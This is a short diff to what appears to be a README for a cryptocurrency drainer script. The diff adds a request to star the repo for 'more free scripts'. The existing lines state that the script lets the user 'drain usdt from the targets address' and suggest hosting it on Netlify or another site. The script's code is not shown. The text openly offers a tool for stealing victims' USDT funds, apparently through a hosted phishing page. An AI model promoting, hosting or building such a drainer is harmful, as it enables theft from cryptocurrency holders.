@@ -1,3 +1,6 @@
+PLEASE ADD STAR TO REPO IF YOU WANT MORE FREE SCRIPTS
+
+
 This script will let you drain usdt from the targets address
 
 go to https://www.netlify.com/ to host or host it on a regular site
